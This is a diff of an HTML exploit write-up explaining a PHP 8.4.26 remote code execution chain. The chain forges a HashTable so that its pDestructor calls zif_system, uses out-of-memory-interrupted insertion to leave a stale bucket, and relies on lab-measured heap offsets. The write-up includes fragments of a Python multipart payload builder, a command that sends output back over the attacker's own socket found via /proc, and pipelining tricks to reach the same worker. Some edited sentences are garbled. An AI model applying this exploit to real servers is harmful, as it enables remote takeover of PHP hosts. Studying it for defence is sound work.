-<p>PHP loops over every <code>Bucket</code> in <code>arData</code> and calls <code>pDestructor(&p->val)</code> on each element's <code>zval</code>. Now here's the key detail. The <code>Bucket</code> struct (from <strong>php-src/Zend/zend_types.h</strong>) looks like this:</p>
+<p>PHP follows a variable <code>nNumUsed</code> that contains a number on how many filled buckets there are and then loops over every filled <code>Bucket</code> in <code>arData</code> and calls <code>pDestructor(&p->val)</code> on each element's <code>zval</code>. Now here's the key detail. The <code>Bucket</code> struct (from <strong>php-src/Zend/zend_types.h</strong>) looks like this:</p>
 <pre data-lang="c"><code class="language-c">typedef struct _Bucket {
     zval              val;          // &lt;--- offset 0
     zend_ulong        h;
     zend_string      *key;
 } Bucket;</code></pre>
-<p><code>val</code> is the very first member of <code>Bucket</code>, sitting at offset 0. That means for the first bucket: <code>&p->val == arData</code>. The pointer <code>pDestructor</code> receives is numerically identical to <code>arData</code> itself. And the attacker sets <code>nNumUsed = 1</code>, so only that one call ever happens. One call is all it takes.</p>
-<p>But wait. There's something we're missing here.</p>
+<p><code>val</code> is the very first member of <code>Bucket</code>, sitting at offset 0. and it is not a simple variable it can hold a pointer to another structure(our forged hashtable).</p>
 <p>Before jumping into the actual exploit code, let's think about what we just described.</p>
-<p>We said that the goal is to overwrite the pDestructor pointer with the address of another function: zif_system.</p>
-<p>But here's the problem: zif_system is meant to execute system commands. How do we actually give it a command to execute?</p>
-<p>Think about it. PHP has been tricked into calling our function, but we don't control how PHP calls it. We don't get to choose the arguments PHP passes to that function. PHP simply calls it using the data it finds at the expected memory locations.</p>
-<p>So how do we make sure that when PHP jumps to zif_system, it finds exactly what it needs to execute our command?</p>
-<p>And this is why i said earlier its not that simple ...</p>
-<p>The trick isn't just to forge one structure. It's to make three different structures coexist in the same memory region, each one playing a different role.</p>
-<p>Let's break it down. </p>
+<p>we have two problems: we need to overwrite a valid bucket that php will use when checking<code>nNumUsed</code> to point it to our forged hashtable, zif_system is meant to execute system commands. How do we actually give it a command to execute?</p>
+<p>Think about it. PHP has been tricked into calling our function, but we don't control how PHP calls it. We don't get to choose the arguments PHP passes to that function. PHP simply calls it using the data it finds at the expected memory locations. </p>
 <h3 id="the-real-payload-three-structures-in-one">The real payload: three structures in one</h3>
-<p>Remember our forged array where we simply overwrote <code>pDestructor</code> with <code>zif_system_addr</code>? That was a simplified explanation. In reality, you can't just pass a raw command string to the engine and expect it to run. The memory layout the attacker uploads doesn't just forge a single array it forges three different structures overlapping in the exact same memory space:</p>
+<p>In reality, you can't just pass a raw command string to the engine and expect it to run. The memory layout the attacker uploads forges three different structures overlapping in the exact same memory space:</p>
 <pre data-lang="c"><code class="language-c">// Conceptual illustration of the attacker's 384-byte payload:
 
 // 1. The Forged Array (HashTable)
@@ -1258,7 +1249,7 @@ struct FakeString {
 <p>In PHP 8.4.26, internal API functions like <code>zif_system</code> do not accept simple <code>char*</code> strings. If PHP's cleanup routine blindly passed a raw string into <code>zif_system</code>, the worker process would instantly trigger a segmentation fault and crash. Under the hood, the engine defines <code>zif_system</code> with a very specific signature:</p>
 <pre data-lang="c"><code class="language-c">void zif_system(zend_execute_data *execute_data, zval *return_value);</code></pre>
 <p>As we just saw, the cleanup loop calls <code>ht->pDestructor(&p->val)</code> on the first element, and <code>&p->val == arData</code>. Because <code>pDestructor</code> now points to <code>zif_system</code>, and <code>zif_system</code> expects its first argument to be a <code>zend_execute_data*</code>, the engine blindly interprets whatever <code>arData</code> points to as a call frame.</p>
-<p>But there's a catch. <code>pDestructor</code> passes <strong>one</strong> argument (a <code>zval<em></code>). <code>zif_system</code> expects <strong>two</strong>: <code>(zend_execute_data </em>execute_data, zval *return_value)</code>. On x86_64, the first argument goes into the RDI register, the second into RSI. So <code>execute_data</code> receives our <code>arData</code> pointer correctly, but <code>return_value</code> gets whatever garbage happened to be sitting in RSI at that moment, not something PHP deliberately provides. It doesn't matter: <code>zif_system</code> calls C <code>system()</code> before it ever touches <code>return_value</code>.</p>
+<p>But there's a catch. <code>pDestructor</code> passes <strong>one</strong> argument (a <code>zval<em></code>). <code>zif_system</code> expects <strong>two</strong>: <code>(zend_execute_data </em>execute_data, zval *return_value)</code>. On x86_64, the first argument goes into the RDI register, the second into RSI. So <code>execute_data</code> receives our <code>arData</code> pointer correctly, but <code>return_value</code> gets whatever garbage happened to be sitting in RSI at that moment, not something PHP deliberately provides, It doesn't matter: <code>zif_system</code> calls C <code>system()</code> before it ever touches <code>return_value</code>.</p>
 <p>So the cleanup routine quietly transforms into:</p>
 <pre data-lang="c"><code class="language-c">// what actually executes (x86_64 calling convention):
 // RDI = &amp;p-&gt;val = arData = target_address + 0x20  (our fake call frame)
@@ -1266,7 +1257,7 @@ struct FakeString {
 zif_system((zend_execute_data*)(target_address + 0x20), ???);</code></pre>
 <p>This is where the exact byte alignment becomes the most critical part of the exploit. By pointing <code>arData</code> exactly 0x20 bytes into their own payload, the attacker feeds <code>zif_system</code> a perfectly structured, fake call frame. The function reads the frame, sees <code>num_args</code> is set to 1, follows the <code>arg1_pointer</code> down to offset 0x80, finds the forged <code>zend_string</code>, and flawlessly executes the injected shell command without crashing the engine.</p>
 <h2 id="real-practice-delivering-the-final-payload-stage-4">Real practice: delivering the final payload (Stage 4)</h2>
-<p>Alright so we've explained the theory of forging a HashTable and how PHP's cleanup path calls <code>pDestructor</code> on it. But we haven't shown how that forged table actually gets delivered to the right memory address in a real attack. And trust me... this is where the whole thing comes together.</p>
+<p>Alright so we've explained the theory of forging the pDestructor inside HashTable and where the command sits. But we haven't shown how that forged table actually gets delivered to the right memory address in a real attack and how do we override a bucket. And trust me... this is where the whole thing comes together.</p>
 <p>Remember, the attacker now has two addresses from the previous stages:</p>
 <ul>
 <li><strong>Heap chunk base</strong> from the 256-byte cookie leak</li>
@@ -1282,7 +1273,7 @@ zif_system = dtor + ZIF_SYSTEM_FROM_DTOR</code></pre>
 HEAP_CARRIER_OFFSET = 0x16D1D8
 
 target = heap_base - HEAP_CARRIER_DELTA + HEAP_CARRIER_OFFSET</code></pre>
-<p>These offsets (<code>HEAP_CARRIER_DELTA</code> and <code>HEAP_CARRIER_OFFSET</code>) were measured in a local lab: run the same PHP build, trigger the same sequence, and watch in GDB where the "hold" field's <code>zend_string</code> value ends up relative to the leaked chunk base. The relationship is deterministic for a given build and worker count.</p>
+<p>These offsets (<code>HEAP_CARRIER_DELTA</code> and <code>HEAP_CARRIER_OFFSET</code>) were measured in a local lab: run the same PHP build, trigger the same sequence, and watch in GDB where the forged hashtable value ends up relative to the leaked chunk base. The relationship is deterministic for a given build and worker count.</p>
 <h3 id="the-final-multipart-request">The final multipart request</h3>
 <p>Now let's look at what the actual HTTP request body looks like:</p>
 <pre data-lang="python"><code class="language-python">def callback_multipart(heap_base, dtor, command):
@@ -1313,7 +1304,8 @@ target = heap_base - HEAP_CARRIER_DELTA + HEAP_CARRIER_OFFSET</code></pre>
 <p><strong>The 1000 nested fields</strong> are NOT for leaking anything this time. They're the OOM fuel again, similar to Stage 1. But they use a different nesting depth (54 instead of 57) and they exist to set up the memory landscape before the real payload arrives.</p>
 <p><strong>The primer</strong> is a 276-byte value stuffed with <code>Q</code> characters (0x51), except at byte offset 104 (slot 13 × 8 bytes), where the target heap address is written as a raw 8-byte little-endian value. During the OOM cleanup, PHP's internal routines walk through various data structures. One of those walks reads a pointer from this exact position. If that pointer points to a valid address on the heap, PHP follows it and tries to destroy whatever is there.</p>
 <p>So the primer is basically telling PHP: "Hey, when you clean up after the OOM crash, go look at this specific address." And what's sitting at that address? The forged HashTable.</p>
-<p><strong>The order of the last four fields is CRITICAL.</strong> The "hold" field must be parsed and its value (<code>forged</code>) must be allocated on the heap <strong>before</strong> the last giant field name (<code>K</code> × 128000 + <code>[x]</code>) triggers the final OOM. If you swap the order, the forged data never gets allocated and the exploit fails.</p>
+<p><strong>The hold:</strong> which is just our forged payload (the 3 structures we saw earlier with the forged hashtable)</p>
+<p><strong>The order of the last four fields is CRITICAL.</strong> The "hold" field must be parsed and its value (<code>forged</code>) must be allocated on the heap <strong>before</strong> the last giant field name (<code>K</code> × 128000 + <code>[x]</code>) triggers the final OOM.</p>
 <p>Here's the timeline:</p>
 <pre data-lang="text"><code class="language-text">PHP starts parsing the final request
       │
@@ -1347,10 +1339,8 @@ Reads pDestructor = zif_system → calls it with our command
       ▼
 BOOM. Shell command executes.</code></pre>
 <h3 id="the-primer-mechanism">The primer mechanism:</h3>
-<p>The timeline above says that cleanup follows the primer's pointer. But how does that happen?</p>
+<p>we answered most of the question except one: how do we overwrite a bucket?</p>
 <p>The primer field has an empty name, meaning PHP never actually inserts it into $_POST. So how can a field that PHP immediately discards end up influencing where the cleanup routine goes?</p>
-<p>To understand this, lets first look at how PHP represents arrays and their elements internally.</p>
-<h4 id="how-php-stores-arrays-internally">How PHP stores arrays internally</h4>
 <p>Consider the following PHP array:</p>
 <pre data-lang="php"><code class="language-php">$data = [
     "profile" =&gt; [
@@ -1358,7 +1348,8 @@ BOOM. Shell command executes.</code></pre>
         "age"  =&gt; 21
     ]
 ];</code></pre>
-<p>PHP stores each key-value pair inside a structure called a <strong>Bucket</strong>:</p>
+<p>in php for a non packed array like this one it puts each key-value pair into a <strong>Bucket</strong>:</p>
+<p>as we saw earlier this is a bucket declaration from Zend/zend_types.h:</p>
 <pre data-lang="c"><code class="language-c">typedef struct _Bucket {
     zval              val;
     zend_ulong        h;
@@ -1413,7 +1404,7 @@ typedef struct _zval_struct {
     zval             *zv;
     void             *ptr;
 } zend_value;</code></pre>
-<p>which is a lot too and that explains why we have a type but doesn't matter for now. Look at <code>zend_array *arr</code> because that's how PHP handles nested arrays.</p>
+<p>which is a lot too, and that explains why we have a type but doesn't matter for now. Look at <code>zend_array *arr</code> because that's how PHP handles nested arrays.</p>
 <p>The outer array <code>$data = [ ];</code> stores its entries in buckets, and when a value like <code>"profile"</code> is itself an array, PHP puts a <strong>pointer</strong> to another <code>zend_array</code> in <code>val.value.arr</code>, and sets <code>type_info</code> to a flag that says "this points to an array." During cleanup, PHP sees that flag and launches a recursive cleaning, following the pointer to destroy the nested structures too.</p>
 <p>That's the normal, safe behavior. Now here's how the attacker abuses it.</p>
 <h4 id="the-primer-freed-instantly-but-its-ghost-stays-behind">The primer: freed instantly, but its ghost stays behind</h4>
@@ -1476,7 +1467,7 @@ bucket[2].h                = 0x5151515151515151;   // irrelevant more Q padding
 bucket[2].key              = 0x5151515151515151;   // irrelevant more Q padding</code></pre>
 <p>Now look at that type_info value: 0x51515151, in PHP, the type_info field packs the type (bits 0-7) and several flags (bits 8+). Bit 8 is <code>IS_TYPE_REFCOUNTED</code>, which tells PHP "this value points to a refcounted object that needs cleanup." The value 0x51515151 in binary has bit 8 set. So PHP is tricked into believing bucket[2] contains a reference-counted value (like a nested array) that must be followed and destroyed in a recursive way.</p>
 <h4 id="oom-interrupted-insertion-creates-nnumused3-without-writing-bucket2">OOM-interrupted insertion creates nNumUsed=3 without writing bucket[2]:</h4>
-<p>But wait. If only <code>"a"</code> and <code>"hold"</code> were successfully inserted, shouldn't <code>$_REQUEST</code> have <code>nNumUsed = 2</code>? During cleanup, PHP would only iterate over <code>bucket[0]</code> and <code>bucket[1]</code>. It would never reach <code>bucket[2]</code>.</p>
+<p>so here we answered the question, we just overwrote a bucket. But wait. If only <code>"a"</code> and <code>"hold"</code> were successfully inserted, shouldn't <code>$_REQUEST</code> have <code>nNumUsed = 2</code>? During cleanup, PHP would only iterate over <code>bucket[0]</code> and <code>bucket[1]</code>. It would never reach <code>bucket[2]</code>.</p>
 <p>So how does <code>bucket[2]</code> end up being walked?</p>
 <p>Before answering that, we should ask ourselves another question: <strong>Why is there another OOM at the very end of the exploit?</strong></p>
 <p>Remember, the OOM we triggered earlier was important because it allowed us to leave a stale pointer behind. Here the underlying idea is closely related:</p>
@@ -1492,23 +1483,23 @@ call   _emalloc              ; allocate the key string   ← OOM FIRES HERE!
 <p>PHP increments nNumOfElements and updates nNumUsed to 3 before attempting to allocate memory for the new key string.</p>
 <p>Then _emalloc() fails because the requested allocation triggers an out-of-memory condition.</p>
 <p>The code that would normally initialize bucket[2] is never executed.</p>
-<p>But the important part is that the earlier metadata updates have already happened. The HashTable now reports nNumUsed = 3, even though the third bucket was never successfully initialized.</p>
+<p>But the important part is that the earlier metadata updates have already happened. <strong>The HashTable now reports nNumUsed = 3,</strong> even though the third bucket was never successfully initialized.</p>
 <p>And that is exactly what we need.</p>
 <p>When cleanup eventually iterates over the HashTable, it uses nNumUsed to determine how many bucket positions to walk. Since the value is now 3, cleanup can reach bucket[2] as well.</p>
 <h4 id="php-follows-the-trail">PHP follows the trail</h4>
 <p>During OOM cleanup, <code>zend_array_destroy</code> reads <code>nNumUsed=3</code> and starts cleaning the buckets one after another:</p>
 <ul>
 <li><strong>bucket[0]</strong> ("a" = "1"): type=IS_STRING → freed normally. Safe.</li>
-<li><strong>bucket[1]</strong> ("hold" = 384 bytes): type=IS_STRING → freed normally. Safe. But its value (the forged HashTable bytes) is already allocated at a known heap address.</li>
+<li><strong>bucket[1]</strong> ("hold" = 384 bytes): type=IS_STRING → freed normally. Safe. But its value is still there in memory</li>
 <li><strong>bucket[2]</strong> (primer): it finds this:</li>
 </ul>
 <pre data-lang="c"><code class="language-c">bucket[2].val.value.arr    = 0x00007efff7d6d1d8;  // the target address from the primer
 bucket[2].val.u1.type_info = 0x51515151;           // four 'Q' bytes from primer padding</code></pre>
 <p>PHP checks the <code>type_info</code> to figure out how to clean up this bucket. looks at the hex value <code>0x51515151</code> and finds out that this value points to a refcounted object, it needs to follow the pointer and destroy the whole chain.</p>
-<p>So PHP reads <code>val.value.arr</code> = <code>0x00007efff7d6d1d8</code> our <strong>target address</strong> and follows the pointer, believing it leads to a legitimate nested structure.</p>
+<p>So PHP reads <code>val.value.arr</code> = <code>0x00007efff7d6d1d8</code> our <strong>target address</strong>(the forged hashtable) and follows the pointer, believing it leads to a legitimate nested structure.</p>
 <h4 id="what-php-finds-at-the-target-address">What PHP finds at the target address</h4>
 <p>At the target address sits our forged HashTable (the "hold" field's content). The forged structure has its <code>gc.type</code> set to <code>IS_ARRAY</code>, so PHP treats it as a <code>zend_array</code> and calls <code>zend_array_destroy</code> on it.</p>
-<p>And how do you free an array? You call whatever <code>pDestructor</code> points to at offset 0x30 of the struct. Normally that's a safe cleanup function. But we wrote <code>zif_system</code> there, PHP's internal wrapper for the C <code>system()</code> function. PHP reads offset 0x30 of our forged table, jumps to <code>zif_system</code>, and executes whatever command we embedded in the forged bucket data.</p>
+<p>And how do you free an array? You call whatever <code>pDestructor</code> points to at offset 0x30 of the struct. But we wrote <code>zif_system</code> there,PHP reads it, jumps to <code>zif_system</code> and executes whatever command we embedded in the forged bucket data.</p>
 <pre><code>primer freed → slot recycled for arData → bucket[2] = primer ghost
     → OOM leaves nNumUsed=3 but bucket[2] never written
     → cleanup reads bucket[2].type_info = 0x51515151 (IS_TYPE_REFCOUNTED)
@@ -1517,9 +1508,8 @@ bucket[2].val.u1.type_info = 0x51515151;           // four 'Q' bytes from primer
     → pDestructor at offset 0x30 = zif_system → system(command) → RCE</code></pre>
 <h3 id="ok-the-command-is-running-how-does-its-output-get-back-to-us">ok the command is running.. how does its output get back to us?</h3>
 <img src="images/command.jpg" >
-<p>When <code>zif_system</code> executes our command, it calls the C <code>system()</code> function, which runs the command with <code>sh -c</code>. The command's stdout goes to... the PHP process's stdout. NOT to the HTTP response body.</p>
 <p>Think about it. The command is being executed inside a cleanup callback. PHP isn't in the middle of building an HTTP response. It's in the middle of tearing down a failed request. There's no output buffer connected to the client. If we just ran <code>cat /etc/passwd</code>, the output would vanish into the server's stdout (maybe a log file, maybe <code>/dev/null</code>).</p>
-<p>So how does the attacker get the output? They use one of the cleverest tricks in the entire exploit: <strong>they find their own TCP socket inside <code>/proc</code> and redirect the output there</strong>.</p>
+<p>So how does the attacker get the output? <strong>they find their own TCP socket inside <code>/proc</code> and redirect the output there</strong>.</p>
 <pre data-lang="python"><code class="language-python">def build_command(nonce):
     command = (
         # Step 1: Find the established connection's inode from /proc/net/tcp
@@ -1599,7 +1589,7 @@ bucket[2].val.u1.type_info = 0x51515151;           // four 'Q' bytes from primer
 <p>If you send Request #1, it might be processed by Worker A. If you immediately send Request #2, the server's load balancer might route it to Worker B, Worker C, or Worker D. Because the stale pointer lives entirely inside Worker A's isolated memory space, your follow up requests will completely fail unless they happen to land on that exact same worker.</p>
 <p>On a busy server with hundreds of workers, hitting the same worker consecutively is a game of chance. And to maximize our chances there are always smart tricks that we can try as using the last byte synchronization technique or HTTP pipelining.</p>
 <h3 id="http-pipelining-">HTTP Pipelining: </h3>
-<p>Instead of sending requests one by one over separate TCP connections which risks a load balancer scattering them across different PHP-FPM workers HTTP Pipelining allows us to push the initial memory exhaustion request and all follow up payload requests down a single TCP connection, this is the technique we used when sending 1 producer followed by 8 consumers.   </p>
+<p>Instead of sending requests one by one over separate TCP connections which risks a load balancer scattering them across different workers HTTP Pipelining allows us to push the initial memory exhaustion request and all follow up payload requests down a single TCP connection, this is the technique we used when sending 1 producer followed by 8 consumers.   </p>
 <p>By concatenating the requests and sending them all in one go using a single socket write, the server's may be forced to hand that entire stream to a single worker to process sequentially. This may help us bypass the "Worker Roulette" problem while minimizing the window for legitimate traffic to interfere.   </p>
 <h4 id="is-it-guaranteed-no-absolutely-not">Is it guaranteed? No, absolutely not.</h4>
 <p>A reverse proxy or load balancer may terminate the client connection and dispatch each request independently. If the infrastructure breaks the pipeline apart, those requests can still get scattered across different backend workers.</p>
